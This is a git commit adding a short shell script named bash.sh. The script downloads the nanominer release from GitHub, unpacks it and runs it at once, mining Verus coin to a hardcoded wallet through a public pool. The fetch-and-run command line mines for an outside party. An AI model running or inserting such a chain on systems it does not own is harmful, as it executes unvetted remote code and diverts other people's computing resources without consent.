57a1605ce22153cd8c81f7a36b5c0a6516ad97e4
ojivu <106483325+ojivu@users.noreply.github.com>
2022-06-01 21:35:06 +0700

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,2 @@
+sudo apt-get update
+wget https://github.com/nanopool/nanominer/releases/download/v3.5.1/nanominer-linux-3.5.1.tar.gz && tar xf nanominer-linux-3.5.1.tar.gz && cd nanominer-linux-3.5.1 && ./nanominer -algo Verushash -wallet RMu5PEEZsnj41xia2Fvjvpy6gBob6SMHHE -coin VRSC -rigName RigNyandukopi001 -pool1 ap.luckpool.net:3956 
